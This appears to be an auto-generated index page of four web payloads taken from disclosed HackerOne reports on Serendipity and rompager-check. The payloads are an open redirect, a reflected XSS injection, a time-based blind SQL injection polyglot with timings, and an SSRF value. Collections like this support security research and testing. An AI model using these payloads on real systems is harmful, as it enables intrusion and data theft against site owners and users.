# Hanno's projects

4 payloads.

### `3ed5382d`

```
https://target.com/exit.php?url=aHR0cHM6Ly9nb29nbGUuY29t
```

**Parameter:** `url`
— [Open redirect in Serendipity (exit.php)](https://hackerone.com/reports/373932) · Hanno's projects · [bb9866f3f743d6bf69b6836](https://hackerone.com/bb9866f3f743d6bf69b6836)

### `93d37d33`

```
1. Access                                                                          ]=admin&serendipity[adminModule]=entries&serendipity[adminAction]=editSelect&serendipity[filter][author]=1xx");alert(document.domain);// while being authenticated;
```

**Parameter:** `serendipity[filter][author]`
— [Reflected Cross-Site Scripting in Serendipity (serendipity.SetCookie)](https://hackerone.com/reports/373950) · Hanno's projects · [bb9866f3f743d6bf69b6836](https://hackerone.com/bb9866f3f743d6bf69b6836)

### `b8e4c5eb`

```
if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/ => 3.276 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.28 s
if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/ => 9.298 s
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/ => 6.272 s
if(no
```

— [blind sql injection](https://hackerone.com/reports/374027) · Hanno's projects · [geeknik](https://hackerone.com/geeknik)

### `74b77666`

```
https://target.com/?ip=localhost;
```

**Parameter:** `ip`
— [SSRF in rompager-check](https://hackerone.com/reports/374818) · Hanno's projects · [bb9866f3f743d6bf69b6836](https://hackerone.com/bb9866f3f743d6bf69b6836)
